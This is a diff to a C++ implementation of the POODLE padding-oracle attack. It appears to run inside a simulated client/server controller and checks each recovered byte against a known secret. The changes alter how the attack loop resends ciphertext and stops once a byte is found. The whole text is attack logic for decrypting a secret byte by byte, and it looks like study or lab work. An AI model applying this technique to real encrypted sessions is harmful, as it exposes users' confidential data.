@@ -1,5 +1,6 @@
 #include "poodle.h"
 #include "../common/conf.h"
+#include "../common/utils.h"
 PoodleDecrypter::PoodleDecrypter(int max_len, int _block_size, T_Controller* _ctrl):max_len(max_len), block_size(_block_size), ctrl(_ctrl){
 
 };
@@ -35,12 +36,14 @@ bool PoodleDecrypter::run(const std::string secret, const std::string known_head
     for (int i=0; i<two_block; i++)
         buf[i] = 'A';
     strcpy(buf + two_block, secret.c_str());
+    for (int i=two_block + secret_len; i<secret_len+block_size*3; i++)
+        buf[i] = 'B';
     int pad =  block_size - 1 - known_len % block_size;
     for (int i=known_len; i<=secret_len; i++)
     {
-        for (char ch=0; ch<256; ch++) {
-            buf[i + 2 * block_size] = ch;
-            ctrl->send_client_instruction(T_Instr::ENCRYPTED_MESSAGE_TO_PEER, buf + (block_size - pad), pad + secret_len);
+        int len = round_up(pad + secret_len, block_size);
+        while (true) {
+            ctrl->send_client_instruction(T_Instr::ENCRYPTED_MESSAGE_TO_PEER, buf + (block_size - pad), len);
             ctrl->send_server_instruction(T_Instr::RECEIVED_PLAIN_TO_ME, nullptr, 0);
             int recv_len = ctrl->recv_server_message(last_recv);
             int block_to_be_changed = 1 + (i + pad) / block_size; 
@@ -53,6 +56,7 @@ bool PoodleDecrypter::run(const std::string secret, const std::string known_head
                 buf_ptr ++;
                 recv_ptr ++;
             }
+            
             ctrl->send_client_instruction(T_Instr::PLAIN_MESSAGE_TO_PEER, buf + (block_size -pad), pad + block_size + secret_len);
             ctrl->send_server_instruction(T_Instr::RECEIVED_CHECK_VALID, nullptr, 0);
             bool isValid;
@@ -62,6 +66,7 @@ bool PoodleDecrypter::run(const std::string secret, const std::string known_head
                 printf("%c", real_ch);
                 if (real_ch != secret[i]) return false;
                 pad--;
+                break;
             }
         }
     }
